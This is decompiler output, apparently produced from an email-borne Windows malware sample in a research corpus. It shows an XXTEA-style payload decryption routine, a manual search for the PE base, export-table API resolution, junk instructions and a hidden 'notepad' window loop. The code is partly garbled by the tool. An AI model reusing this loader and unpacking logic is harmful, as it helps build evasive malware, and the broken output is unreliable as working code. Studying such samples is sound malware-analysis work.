/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0752/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00401008 -> 00400f95 */
/*	Procedure: 0x00401000 - 0x004011FF
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401000(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    asm("pusha");
    if(ecx = ecx + *edi) {
        goto L00400f95;
    }
    ebp = ebp - 1;
    asm("adc [edi],cl");
    asm("outsb");
    asm("ror dword [ebx+0x328b0855],1");
    if(ecx <= 1) {
        if(ecx < -1) {
            goto L0040110f;
        }
    } else {
        ebx = 0;
        asm("movd mm7,ebx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        edi = *(A8 + ecx * 4);
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
L00401043:
        eax = eax - 1;
        asm("movd mm0,eax");
        asm("movd ebx,mm7");
        ebx = ebx + -1640531527;
        asm("movd mm7,ebx");
        eax = ebx >> 2 & 3;
        asm("movd mm1,eax");
        eax = 0;
        asm("movd mm3,eax");
        edx = A8;
L00401066:
        esi = *(edx + eax * 4 + 4);
        ebx = edi >> 5;
        ecx = esi << 2;
        ebx = ebx ^ ecx;
        edx = esi >> 3;
        edx = edx ^ edi << 4;
        ebx = ebx + edx;
        asm("movd edx,mm3");
        asm("movd ecx,mm1");
        edx = edx & 3 ^ ecx;
        eax = Ac;
        ecx = *(eax + edx * 4) ^ edi;
        asm("movd eax,mm7");
        eax = (eax ^ esi) + ecx;
        ebx = ebx ^ eax;
        asm("movd eax,mm3");
        edx = A8;
        ebx = ebx + *(edx + eax * 4);
        edi = ebx;
        *(edx + eax * 4) = ebx;
        asm("movd ecx,mm4");
        eax = eax + 1;
        asm("movd mm3,eax");
        if(eax != ecx) {
            goto L00401066;
        }
        esi = *edx;
        ebx = edi >> 5;
        ecx = esi << 2;
        ebx = ebx ^ ecx;
        edx = esi >> 3;
        edx = edx ^ edi << 4;
        ebx = ebx + edx;
        asm("movd edx,mm3");
        asm("movd ecx,mm1");
        edx = edx & 3 ^ ecx;
        eax = Ac;
        ecx = *(eax + edx * 4) ^ edi;
        asm("movd eax,mm7");
        eax = (eax ^ esi) + ecx;
        ebx = ebx ^ eax;
        asm("movd ecx,mm4");
        edx = A8;
        ebx = ebx + *(edx + ecx * 4);
        edi = ebx;
        *(edx + ecx * 4) = ebx;
        asm("movd eax,mm0");
        if(eax != 0) {
            goto L00401043;
        }
        goto L004011fb;
L0040110f:
        asm("movd ecx,mm2");
        ecx = ~ecx;
        asm("movd mm2,ecx");
        ecx = ecx - 1;
        asm("movd mm4,ecx");
        ecx = ecx + 1;
        edx = 0;
        edx = ecx / ecx % ecx / ecx;
        eax = 58;
        ecx = -1640531527;
        asm("mul ecx");
        if(eax != 0) {
L00401137:
            asm("movd mm7,eax");
            eax = eax >> 2 & 3;
            asm("movd mm1,eax");
            asm("movd ecx,mm4");
            if(ecx > 0) {
L00401150:
                asm("movd mm3,ecx");
                edi = *(A8 + (ecx - 1) * 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                ebx = ebx ^ (eax ^ esi) + ecx;
                asm("movd ecx,mm3");
                edx = A8;
                eax = *(edx + ecx * 4) - ebx;
                esi = eax;
                *(edx + ecx * 4) = eax;
                if(ecx = ecx - 1) {
                    goto L00401150;
                }
                asm("movd mm3,ecx");
                asm("movd ecx,mm4");
                edi = *(edx + ecx * 4);
                ebx = edi >> 5;
                ecx = esi << 2;
                ebx = ebx ^ ecx;
                edx = esi >> 3;
                edx = edx ^ edi << 4;
                ebx = ebx + edx;
                asm("movd edx,mm3");
                asm("movd ecx,mm1");
                edx = edx & 3 ^ ecx;
                eax = Ac;
                ecx = *(eax + edx * 4) ^ edi;
                asm("movd eax,mm7");
                ebx = ebx ^ (eax ^ esi) + ecx;
                edx = A8;
                eax = *edx - ebx;
                esi = eax;
                *edx = eax;
                asm("movd eax,mm7");
                if(eax = eax - -1640531527) {
                    goto L00401137;
                }
            }
        }
    }
L004011fb:
    asm("popa");
}

/*	Procedure: 0x00401200 - 0x0040126D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401200()
{



    edi = ax & 4096;
    (save)0x40125a;
    (save) *%fs:0x0];
    for(*%fs:0x0] = esp; 1; edi = edi - 4096) {
        *L00403748 = esp;
        eax = 0;
        *L0040374C = ebp;
        *L00403750 = edi;
        if(*edi == 23117) {
            eax = *(edi + 60);
            esi = edi;
            edi = edi + eax;
            if(*edi == 17744) {
                break;
            }
        }
L00401252:
    }
    eax = esi;
    *%fs:0x0] = *esp;
    esp = esp + 8;
    return;
    edi = *L00403750;
    esp = *L00403748;
    ebp = *L0040374C;
    goto L00401252;
}

/*	Procedure: 0x0040126E - 0x00401285
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L0040126E()
{
	/* unknown */ void  esi;



    eax = 0;
    for(edx = 0; *esi != 0; edx = edx + 1) {
        asm("cmpsb");
        == ? L00401273 : ;
        asm("scasb");
        != ? 0x40127b : ;
        (restore)esi;
    }
    return(edx);
}

/*	Procedure: 0x00401286 - 0x004012E5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401286()
{
	/* unknown */ void  ebp;



    if(*""() == -2) {
        ebx = *L004020F5;
    }
    esi = 0x4020f5;
    (save)0x4020f5;
    ebp = *(ebx + *(ebx + 60) + 120) + ebx;
    edi = *( *(ebp + 32) + ebx) + ebx;
    (restore)edx;
    eax = L0040126E(edx);
    edx = *(ebp + 36) + ebx;
    ecx = *(ebp + 16);
    eax = edx + eax * 2 + 2;
    eax = eax - ecx + ecx;
    eax = *eax & 65535;
    eax = *( *(ebp + 28) + ebx + eax * 4) + ebx;
    (restore)edx;
    *edx = eax;
}

/*	Procedure: 0x004012E6 - 0x004012EB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    L004012EC();
}

/*	Procedure: 0x004012EC - 0x004012F2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012EC()
{



    L004012F3();
    ebx = ebx + ebp;
}

/*	Procedure: 0x004012F3 - 0x00401501
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004012F3()
{



    goto L004012f6;
    asm("adc [eax+0x72],ebp");
    *eax = *eax & al;
    *L004020F5 = *__imp__LoadLibraryA();
    (save)"GetCurrentThread";
    (save) *L004020F5;
    *"" = *__imp__GetProcAddress();
    eax = *"";
    *L004020F5 = L00401200();
    while(*""() != -2) {
    }
    L00401286();
    (save)-68157569;
    (save)68174145;
    (save)-715822422;
    (save)1860025271;
    ecx = 15781545;
    al = al ^ *ebp;
    asm("finit");
    eax = 0;
    goto L0040136d;
    (save)es;
L0040136d:
    asm("loop 0x401362");
    (save)"ExitProcess";
    (save) *L004020F5;
    __imp__ExitProcess = *__imp__GetProcAddress();
    (save)"kernel32.dll";
    *L004020F5 = *__imp__LoadLibraryA();
    (save) *L004020F5;
    L00401000(0x405bb7, 0x407eb8, -2240);
    (restore)eax;
    *L00405BB9 = eax;
    (save)"GetCurrentThread";
    (save) *L004020F5;
    eax = *__imp__GetProcAddress();
    *"" = eax;
    *"1o" = 76;
    goto L004013d5;
    asm("imul byte [eax+0x7f]");
L004013d5:
    *eax = *eax & al;
    (save) *L004020F5;
    *__imp__GetProcAddress();
    *L004020F9 = eax;
    goto L004013ee;
    asm("adc [eax+0x3b],ch");
L004013ee:
    *eax = *eax & al;
    (save) *L004020F5;
    *__imp__GetProcAddress();
    *L004020FD = eax;
    goto L00401407;
    ch = ch | *(eax + 103);
L00401407:
    *eax = *eax & al;
    *__imp__LoadLibraryA();
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBD = 1;
    }
    (save)"Nh; @";
    (save)eax;
    eax = *__imp__GetProcAddress();
    if(eax != 0) {
    } else {
        eax = 1;
        *L00405BBD = 1;
    }
    *L00403EB6 = eax;
    (save)0;
    *L004020C1 = *L004020f9();
    goto L00401451;
    asm("xchg eax,ecx");
L00401451:
    (save)"usš @";
    ebx = *__imp__LoadLibraryA();
    edi = "CreateWindowExA";
    esi = "";
    L00401502();
    (save)32512;
    (save)0;
    *L004020C5 = *L0040218b();
    (save)32512;
    (save)0;
    *L004020C9 = *L0040218f();
    (save)"";
    *L00402193();
    (save)0;
    (save) *L004020C1;
    (save)0;
    (save)0;
    (save)192;
    (save)256;
    (save)-1000;
    (save)-1000;
    (save)4718592;
    (save)"notepad window";
    (save)"notepad class";
    (save)0;
    eax = *""();
    goto L004014d6;
    *edi = al;
    edi = edi + 1;
L004014d6:
    (save)128;
    (save)-20;
    (save)eax;
    *L004021a7();
L004014e4:
    (save)0;
    (save)0;
    (save)0;
    (save)0x4020d9;
    *L00402197();
    (save)0x4020d9;
    *L0040219f();
    goto L004014e4;
}

stack space not deallocated on return
/*	Procedure: 0x00401502 - 0x0040151B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401502()
{



    do {
        *esi = *__imp__GetProcAddress(ebx, edi);
        eax = 0;
        ecx = -1;
        asm("repne scasb");
        esi = esi + 4;
    } while(*edi != 0);
}

/*	Procedure: 0x0040151C - 0x0040157B
 *	Argument size: 16
 *	Local size: 4
 *	Save regs size: 4
 */

L0040151C(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffffc;



    (save)esi;
    (save)edi;
    if(Ac != 1) {
        (save)A14;
        (save)A10;
        (save)Ac;
        (save)A8;
        *L004021a3();
    } else {
        ecx = & Vfffffffc;
        *L004020fd(0, 0, 0x401564, 0, 0, ecx);
        eax = 0;
        goto L0040155d;
        *(edi + 94) = *(edi + 94) ^ ebx;
    }
L0040155d:
    return;
    al = 100 - bl;
    goto (4202494 - *""());
}

/* address  size  */
/* 0x004012e6       0 */ /* unknown */ void 	__entry_point__;
/* 0x00408086       0 */ /* unknown */ void 	__imp__GetSystemMetrics;
/* 0x0040808a       0 */ /* unknown */ void 	__imp__CreateWindowExA;
/* 0x0040808e       0 */ /* unknown */ void 	__imp__LoadIconA;
/* 0x00408092       0 */ /* unknown */ void 	__imp__LoadCursorA;
/* 0x00408096       0 */ /* unknown */ void 	__imp__RegisterClassA;
/* 0x0040809a       0 */ /* unknown */ void 	__imp__GetMessageA;
/* 0x0040809e       0 */ /* unknown */ void 	__imp__TranslateMessage;
/* 0x004080a2       0 */ /* unknown */ void 	__imp__DispatchMessageA;
/* 0x004080a6       0 */ /* unknown */ void 	__imp__DefWindowProcA;
/* 0x004080aa       0 */ /* unknown */ void 	__imp__EnumChildWindows;
/* 0x004080ae       0 */ /* unknown */ void 	__imp__SetWindowLongA;
/* 0x00408186       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x0040818a       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x0040818e       0 */ /* unknown */ void 	__imp__ExitProcess;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
